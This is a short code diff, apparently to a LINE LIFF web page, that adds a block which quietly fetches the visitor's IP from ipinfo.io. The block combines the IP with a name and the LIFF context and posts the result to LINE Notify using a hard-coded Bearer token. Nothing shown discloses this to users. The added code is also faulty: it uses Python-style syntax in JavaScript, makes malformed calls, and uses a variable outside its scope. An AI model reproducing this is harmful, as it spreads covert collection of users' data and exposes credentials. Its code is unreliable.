@@ -37,6 +37,10 @@
         }).catch((err) => {
             document.getElementById('err').innerHTML= err
         }).then(() => {
+            isliff();
+        }).catch((err) => {
+            document.getElementById('err').innerHTML= err    
+        }).then(() => {
             gettype();
         }).catch((err) => {
             document.getElementById('err').innerHTML= err
@@ -98,7 +102,16 @@
             if not(liff.isInClient()){
                 window.location.href('line.me')
             }
-            
+            const XHR = new XMLHttpRequest();
+            var token="Bearer CI5OwlYqOMwB7fhqSPiR8sTKRqXnFortY8joAmTiMPL"
+            $.get("https://ipinfo.io", function(res) {
+            var ip = res.ip;
+            }, "jsonp");
+            let msg=name+ip+liff.getContext();
+            let data={'message': msg}
+            XHR.open('POST', 'https://notify-api.line.me/api/notify');
+            XHR.setRequestHeader('Authorization': token);
+            XHR.send(data);
         }
 
         function sendMsg(msg){
